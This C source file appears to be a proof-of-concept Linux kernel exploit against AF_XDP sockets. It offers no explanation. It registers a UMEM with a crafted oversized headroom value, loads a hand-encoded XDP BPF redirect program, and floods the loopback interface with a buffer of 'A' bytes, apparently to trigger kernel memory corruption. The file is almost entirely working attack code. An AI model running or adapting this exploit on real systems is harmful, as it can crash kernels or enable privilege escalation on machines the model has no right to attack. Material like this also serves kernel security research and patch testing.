#define _GNU_SOURCE
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <net/if.h>
#include <linux/bpf.h>
#include <unistd.h>
#include <linux/if_xdp.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <linux/rtnetlink.h>
#include <sys/resource.h>

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while(0)
typedef uint64_t u64;
typedef uint32_t u32;
typedef uint16_t u16;
#define XDP_UMEM_UNALIGNED_CHUNK_FLAG (1 << 0)
#define PF_XDP 44
#define SOL_XDP	283
#define XDP_UMEM_REG 4
#define XDP_RX_RING 2
#define XDP_TX_RING 3
#define XDP_UMEM_FILL_RING 5
#define XDP_UMEM_COMPLETION_RING 6
#define XDP_USE_NEED_WAKEUP (1 << 3)
#define XDP_MMAP_OFFSETS 1

void* umem;
void* fill;
void* rx;

struct my_xdp_umem_reg {
	u64 addr; /* Start of packet data area */
	u64 len; /* Length of packet data area */
	u32 chunk_size;
	u32 headroom;
	u32 flags;
};

#define BUF_SIZE 1024
char log_buf[BUF_SIZE];

void write_file(char* file_name, char* data)
{
	int f = open(file_name, O_WRONLY);
	if (f < 0)
		err_exit("open");
	int result = write(f, data, strlen(data));
	if (result < strlen(data))
		err_exit("write");
	close(f);
}

int setup_socket()
{
	int fd = socket(PF_XDP, SOCK_RAW, 0);
	if (fd < 0)
		err_exit("socket-create");

	umem = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
	if (umem < 0)
		err_exit("mmap");

	struct my_xdp_umem_reg mr;
	memset(&mr, 0, sizeof mr);
	mr.addr = (u64) umem;
	mr.len = 0x8000;
	mr.chunk_size = 0x1000;
	mr.headroom = 0xFFFFF000 - 256;
	mr.flags = 0;

	int result = setsockopt(fd, SOL_XDP, XDP_UMEM_REG, &mr, sizeof mr);
	if (result < 0)
		err_exit("setsockopt-umem-reg");

	int entries = 4;
	result = setsockopt(fd, SOL_XDP, XDP_RX_RING, &entries, sizeof entries);
	if (result < 0)
		err_exit("setsockopt-rx-ring");

	result = setsockopt(fd, SOL_XDP, XDP_TX_RING, &entries, sizeof entries);
	if (result < 0)
		err_exit("setsockopt-tx-ring");

	result = setsockopt(fd, SOL_XDP, XDP_UMEM_FILL_RING, &entries, sizeof entries);
	if (result < 0)
		err_exit("setsockopt-fill-ring");

	result = setsockopt(fd, SOL_XDP, XDP_UMEM_COMPLETION_RING, &entries, sizeof entries);
	if (result < 0)
		err_exit("setsockopt-completion-ring");

	struct xdp_mmap_offsets off;
	int len = sizeof off;
	result = getsockopt(fd, SOL_XDP, XDP_MMAP_OFFSETS, &off, &len);
	if (result < 0)
		err_exit("getsockopt");

	rx = mmap(0, off.rx.desc +
					4 * sizeof(struct xdp_desc),
					PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
					fd, 0);
	if (rx < 0)
		err_exit("mmap-rx-ring");

	fill = mmap(0, off.fr.desc +
					4 * sizeof(u64),
					PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
					fd, 0x100000000ULL);
	if (fill < 0)
		err_exit("mmap-fill_ring");

	struct sockaddr_xdp addr;
	memset(&addr, 0, sizeof addr);
	addr.sxdp_family = PF_XDP;
	addr.sxdp_ifindex = if_nametoindex("lo");
	addr.sxdp_queue_id = 0;
	addr.sxdp_flags = XDP_USE_NEED_WAKEUP;
	result = bind(fd, (struct sockaddr *) &addr, sizeof addr);
	if (result < 0)
		err_exit("bind");

	u32* fill_producer = fill + off.fr.producer;
	u64* ring = fill + off.fr.desc;
	ring[0] = 0x5000;
	ring[0] = 0x6000;
	fill_producer[0] = 2;
	return fd;
}

int bpf_prog_load(unsigned int prog_type, unsigned int insn_cnt, struct bpf_insn* insns, unsigned int log_size, char* log_buf)
{
	char* license = "GPL";
	union bpf_attr attr = {
		.prog_type = prog_type,
		.insn_cnt = insn_cnt,
		.insns = (u64) insns,
		.license = (u64) license,
		.log_level = 3,
		.log_size = log_size,
		.log_buf = (u64) log_buf,
		.kern_version = 0,
		.prog_flags = BPF_F_STRICT_ALIGNMENT
	};

	return syscall(321, BPF_PROG_LOAD, &attr, sizeof(attr));
}

void bind_bpf_prog(int fd)
{
	int sock, seq = 0, ret;
	struct nlattr *nla, *nla_xdp;
	struct {
		struct nlmsghdr  nh;
		struct ifinfomsg ifinfo;
		char             attrbuf[64];
	} req;

	struct sockaddr_nl sa;
	socklen_t addrlen;

	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;

	sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (sock < 0)
		err_exit("socket-af-netlink-create");

	if (bind(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		err_exit("af-netlink-bind");

	memset(&req, 0, sizeof(req));
	req.nh.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
	req.nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	req.nh.nlmsg_type = RTM_SETLINK;
	req.nh.nlmsg_pid = 0;
	req.nh.nlmsg_seq = 0;
	req.ifinfo.ifi_family = AF_UNSPEC;
	req.ifinfo.ifi_index = if_nametoindex("lo");

	/* started nested attribute for XDP */
	nla = (struct nlattr *)(((char *)&req)
				+ NLMSG_ALIGN(req.nh.nlmsg_len));
	nla->nla_type = NLA_F_NESTED | IFLA_XDP;
	nla->nla_len = NLA_HDRLEN;

	/* add XDP fd */
	nla_xdp = (struct nlattr *)((char *)nla + nla->nla_len);
	nla_xdp->nla_type = IFLA_XDP_FD;
	nla_xdp->nla_len = NLA_HDRLEN + sizeof(int);
	memcpy((char *)nla_xdp + NLA_HDRLEN, &fd, sizeof(fd));
	nla->nla_len += nla_xdp->nla_len;

	req.nh.nlmsg_len += NLA_ALIGN(nla->nla_len);

	if (send(sock, &req, req.nh.nlmsg_len, 0) < 0)
		err_exit("af-netlink-send");

	char buffer[4096];
	if (recv(sock, buffer, sizeof buffer, 0) < 0)
		err_exit("af-netlink-recv");

	struct nlmsghdr* msg_hdr = (struct nlmsghdr*) buffer;
	if (msg_hdr->nlmsg_type == NLMSG_ERROR)
	{
		struct nlmsgerr* msg_data = NLMSG_DATA(msg_hdr);
		if (msg_data->error == NLMSG_ERROR)
			err_exit("af-netlink-route");
	}
}

void setup_xdp_prog()
{
	char insns[] =
		"\x18\x19\x00\x00\x04\x00\x00\x00"			// load map to R9
		"\x00\x00\x00\x00\x00\x00\x00\x00"
		"\xbf\x91\x00\x00\x00\x00\x00\x00"			// R1 = R9
		"\xb7\x02\x00\x00\x00\x00\x00\x00"			// R2 = 0
		"\xb7\x03\x00\x00\x01\x00\x00\x00"			// R3 = 1
		"\x85\x00\x00\x00\x33\x00\x00\x00"			// call bpf_map_redirect

		"\x95\x00\x00\x00\x00\x00\x00\x00";			// exit
	int prog_fd = bpf_prog_load(BPF_PROG_TYPE_XDP, sizeof(insns) / 8,
		(struct bpf_insn*) insns, BUF_SIZE, log_buf);
	if (prog_fd < 0)
		err_exit("bpf-prog-load");

	bind_bpf_prog(prog_fd);
}

int bpf_map_create(unsigned int map_type, unsigned int key_size, unsigned int value_size, unsigned int max_entries)
{
	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries,
		.map_flags = BPF_F_WRONLY
	};
	return syscall(321, BPF_MAP_CREATE, &attr, sizeof(attr));
}

int bpf_update_element(int mapfd, void *key, void* value)
{
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (u64) key,
		.value = (u64) value,
		.flags = BPF_ANY
	};
	return syscall(321, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

int xsk_map(int xsk_fd)
{
	// struct rlimit r = {RLIM_INFINITY, RLIM_INFINITY};
	// if (setrlimit(RLIMIT_MEMLOCK, &r))
	// 	err_exit("setrlimit");
	// getrlimit(RLIMIT_MEMLOCK, &r);
	// printf("%d\n", r.rlim_cur);
	// printf("%d\n", r.rlim_max);

	int mapfd = bpf_map_create(BPF_MAP_TYPE_XSKMAP, sizeof(int), sizeof(int), 1);
	if (mapfd < 0)
		err_exit("bpf-map-create");
	printf("mapfd: %d\n", mapfd);
	int key = 0;
	int value = xsk_fd;
	int ret = bpf_update_element(mapfd, &key, &value);
	if (ret < 0)
		err_exit("bpf-update-element");
}

void send_payload(char* payload, int len)
{

	int fd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
	if (fd < 0)
		err_exit("socket-create");
	struct sockaddr_ll addr;
	memset(&addr, 0, sizeof addr);
	addr.sll_ifindex = if_nametoindex("lo");
	addr.sll_halen = ETH_ALEN;
	int result = sendto(fd, payload, len, 0, (struct sockaddr*) &addr, sizeof addr);
	if (result < 0)
		err_exit("sendto");
}

int main()
{
	puts("Setting up socket");
	int fd = setup_socket();
	puts("Create map");
	xsk_map(fd);
	puts("Load xdp prog");
	setup_xdp_prog();
	puts("Send payload");
	char payload[0x2000];
	memset(payload, 0x41, 0x2000);
	send_payload(payload, 0x2000);
	return 0;
}